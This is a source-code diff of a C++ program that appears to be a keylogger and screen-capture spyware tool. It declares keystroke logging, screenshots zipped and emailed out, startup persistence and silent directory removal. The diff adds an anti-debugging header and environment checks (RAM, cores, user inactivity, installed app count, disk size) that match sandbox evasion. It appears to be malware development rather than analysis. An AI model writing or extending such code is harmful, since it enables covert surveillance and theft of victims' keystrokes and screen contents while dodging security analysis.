@@ -27,9 +27,8 @@
 #include <intrin.h>
 #include <array>
 
+#include "Antidbg.h"
 #include "log.h"
-
-
 
 using buffer = std::vector<char>;
 
@@ -38,15 +37,19 @@ using buffer = std::vector<char>;
 
 #define CharactersPerLog 300
 #define MaximumFolderSize 10 
-#define RequiredRam 2048 //MB
+#define RequiredRam 2048    //MB
 #define RequiredCores 2 
 #define CryptPassword "MyPassword" 
-#define BaseShiftValue 100 //base int to add to chars for crypting measures
+#define BaseShiftValue 100  //base int to add to chars for crypting measures
 #define SecondsBetweenScreenshots 20
 #define ScreenshotsPerZip 4
 #define SendersEmail ""
 #define SendersPsw ""
 #define RecieversEmail ""
+#define MaxInactivity 10    //max amount of seconds since last input
+#define MinRequiredApps 20  //minimum amount of intalled programs
+#define SecurityLevel 1     //0-3 levels of trust towards environment
+#define MinHardDisk 60      //minimum size for the main partition
 
 //------------------------------------------------------
 
@@ -72,7 +75,6 @@ using buffer = std::vector<char>;
 
 extern "C" int RandomGenerator();
 int SilentlyRemoveDirectory(const char* dir);
-//ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 int CalculateDirSize(std::string DirectoryToCheck);
 BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
 ULONG WINAPI Protect(LPVOID);
@@ -80,6 +82,8 @@ std::string GetCpuInfo();
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
 ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 void TakeScreenShot(const char* filename);
+bool fexists(std::string filename);                          //create native check through CreateFileA()
+void FinalExit();
 //void Compress(const buffer& in, buffer& out);
 
 
